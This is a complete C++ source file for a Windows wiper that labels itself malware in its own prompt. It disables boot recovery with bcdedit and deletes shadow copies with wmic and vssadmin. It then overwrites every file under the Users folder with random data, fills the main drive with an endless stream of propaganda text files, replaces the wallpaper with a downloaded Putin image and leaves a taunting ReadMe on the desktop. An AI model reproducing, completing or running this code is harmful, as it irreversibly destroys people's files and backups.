#include <iostream>
#include <Windows.h>
#include <ShlObj.h>
#include <wininet.h>
#include <fstream>
#include <string.h>
#include <string>
#include <thread>
#include <Urlmon.h>
#include <vector>
#include <ctime>
#include <random>

#define MAX_PATH 260
#pragma warning(disable : 4996)
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib,"urlmon.lib")

using namespace std;

class Functionality {
private:
    HWND window;
    int result1;
    DWORD result2;
    char buffer1[MAX_PATH] = { 0 };
    char main_drive[MAX_PATH] = { 0 };

    bool dirExists(const string& dirName_in) {
        DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
        if (ftyp == INVALID_FILE_ATTRIBUTES)
            return false;

        if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
            return true;

        return false;
    }

    void overwriteWithRandomData(const string& filename, size_t passes = 3) {
        ifstream file(filename, ios::binary | ios::ate);
        if (!file.is_open()) {
            cerr << "Error opening file: " << filename << endl;
            return;
        }

        size_t fileSize = file.tellg();
        file.close();

        mt19937_64 rng(static_cast<unsigned int>(time(nullptr)));
        uniform_int_distribution<unsigned int> dist(0, 255);

        vector<unsigned char> buffer(fileSize);
        for (size_t pass = 0; pass < passes; ++pass) {
            for (size_t i = 0; i < fileSize; ++i) {
                buffer[i] = static_cast<unsigned char>(dist(rng));
            }
            ofstream outFile(filename, ios::binary | ios::trunc);
            if (!outFile.is_open()) {
                cerr << "Error opening file for writing: " << filename << endl;
                continue; 
            }
            outFile.write(reinterpret_cast<char*>(buffer.data()), fileSize);
            outFile.close();

            cout << "File overwritten: " << filename << " (Pass " << (pass + 1) << " of " << passes << ")" << endl;
        }
    }


public:
    Functionality() {
        AllocConsole();

        window = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(window, 0);
    }

    string get_main_drive() {
        memset(buffer1, 0, MAX_PATH);
        memset(main_drive, 0, MAX_PATH);

        result2 = GetLogicalDriveStringsA(MAX_PATH, buffer1);
        if (result2 == 0) {
            cerr << "Error: GetLogicalDriveStringsA failed." << endl;
            return "";
        }

        char* current_drive = buffer1;
        while (*current_drive) {
            if (GetDriveTypeA(current_drive) == DRIVE_FIXED && main_drive[0] == '\0') {
                strcpy(main_drive, current_drive);
                return string(main_drive);
            }
            current_drive += strlen(current_drive) + 1;
        }

        cerr << "Error: Fixed drive not found." << endl;
        return "";
    }

    int warning() {
        result1 = MessageBoxA(NULL, "Are you sure you want to run this malware?", "Warning...", MB_YESNO | MB_ICONWARNING);
        if (result1 == 6) {
            return 0;
        }
        else {
            return 1;
        }
    }

    void forkbomb() {
        get_main_drive();

        const int batchSize = 100;
        int fileCounter = 0;

        while (true) {
            vector<string> fileNames;

            for (int i = 0; i < batchSize; ++i) {
                string File_Name = "PutinIsCool";
                string drive = main_drive;

                string the_string = drive + File_Name + to_string(fileCounter++) + ".txt";
                fileNames.push_back(the_string);
            }

            for (const auto& fileName : fileNames) {
                ofstream TheFile(fileName);
                TheFile.close();
                ofstream AppendFile(fileName, ios::app);

                if (AppendFile.is_open()) {
                    for (int i = 0; i < 1000; ++i) {
                        AppendFile << "Putin is the coolest guy ever!\n";
                    }
                    AppendFile.close();
                }
                else {
                    cerr << "Error opening file for appending: " << fileName << endl;
                }
            }
            Sleep(1000);
        }
    }

    void wallpaper_func() {
        get_main_drive();
        string FolderName = "\\PutinImage";
        string dup = main_drive;
        dup.pop_back();
        dup += FolderName;

        if (!dirExists(dup)) {
            if (!CreateDirectoryA(dup.c_str(), NULL)) {
                cerr << "Error creating directory: " << dup << endl;
                return;
            }
        }

        const char* imageUrl = "https://wegotthiscovered.com/wp-content/uploads/2022/12/vladimir-putin.jpg";
        std::string imagePath = dup + "\\vladimir-putin.jpg";

        if (URLDownloadToFileA(NULL, imageUrl, imagePath.c_str(), 0, NULL) != S_OK) {
            cerr << "Error downloading image from URL: " << imageUrl << endl;
            return;
        }

        const char* imagePathConst = imagePath.c_str();

        if (!SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)imagePathConst, SPIF_UPDATEINIFILE)) {
            cerr << "Error setting desktop wallpaper." << endl;
        }
    }

    void Desktop_Op() {
        PWSTR DesktopPath = NULL;
        if (SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &DesktopPath) != S_OK) {
            cerr << "Error getting Desktop folder path." << endl;
            return;
        }

        int size_needed = WideCharToMultiByte(CP_ACP, 0, DesktopPath, -1, NULL, 0, NULL, NULL);

        char* asciiStr = new char[size_needed];

        if (!WideCharToMultiByte(CP_ACP, 0, DesktopPath, -1, asciiStr, size_needed, NULL, NULL)) {
            cerr << "Error converting WideChar to MultiByte." << endl;
            delete[] asciiStr;
            CoTaskMemFree(DesktopPath);
            return;
        }

        string FolderPathA = string(asciiStr);
        delete[] asciiStr;
        CoTaskMemFree(DesktopPath);
        DesktopPath = nullptr;

        FolderPathA += "\\ReAdMe.txt";

        ofstream TheReadMeFile(FolderPathA);
        if (!TheReadMeFile.is_open()) {
            cerr << "Error opening ReadMe file: " << FolderPathA << endl;
            return;
        }

        TheReadMeFile << "I suggest you take a look at your wallpaper, and main drive. Also your files are being overwritten :)";
        TheReadMeFile.close();

        if ((int)ShellExecuteA(NULL, "open", "notepad.exe", FolderPathA.c_str(), NULL, SW_SHOWMAXIMIZED) <= 32) {
            cerr << "Error opening ReadMe file with Notepad." << endl;
        }
    }

    void DisableAndWipe() {
        const char* commands[4] = { "cmd.exe /c bcdedit /set {default} recoveryenabled no", "cmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures", "cmd.exe /c wmic shadowcopy delete","cmd.exe /c vssadmin delete shadows /quiet /all" };

        for (int i = 0; i < 4; i++) {
            STARTUPINFOA si = { sizeof(STARTUPINFOA) };
            PROCESS_INFORMATION pi;

            if (!CreateProcessA(NULL, (LPSTR)commands[i], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                cerr << "Error creating process: " << commands[i] << endl;
                continue;
            }

            WaitForSingleObject(pi.hProcess, INFINITE);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    void ListFiles(const string& path) {
        WIN32_FIND_DATAA findFileData;
        HANDLE hFind = INVALID_HANDLE_VALUE;

        string searchPath = path + "\\*";

        hFind = FindFirstFileA(searchPath.c_str(), &findFileData);
        if (hFind == INVALID_HANDLE_VALUE) {
            cerr << "Error finding files in directory: " << path << endl;
            return;
        }

        do {
            if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
                string newPath = path + "\\" + findFileData.cFileName;

                if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    ListFiles(newPath);
                }
                else {
                    size_t pos = string(findFileData.cFileName).find_last_of('.');
                    if (pos != string::npos) {
                        string extension = string(findFileData.cFileName).substr(pos);

                        if (extension == ".exe" || extension == ".dll" || extension == ".sys") {
                            continue;
                        }
                    }
                    overwriteWithRandomData(newPath);
                }
            }
        } while (FindNextFileA(hFind, &findFileData) != 0);

        FindClose(hFind);
    }
};

int main() {
    char url[128] = "https://stackoverflow.com/";

    BOOL bConnect = InternetCheckConnectionA(url, FLAG_ICC_FORCE_CONNECTION, 0);
    if (!bConnect) {
        MessageBoxA(NULL, "Please run this program again when you have a stable connection.", "No Connection", MB_OK | MB_ICONHAND);
        return 1;
    }

    Functionality Obj;

    if (Obj.warning() == 1) {
        return 0;
    }

    Obj.DisableAndWipe();

    Obj.Desktop_Op();

    thread fork_thread(&Functionality::forkbomb, &Obj);
    fork_thread.detach();

    Obj.wallpaper_func();

    string dup_main = Obj.get_main_drive();
    dup_main += "Users";

    Obj.ListFiles(dup_main);

    while (true) {
        Sleep(1000); 
    }

    return 0;
}

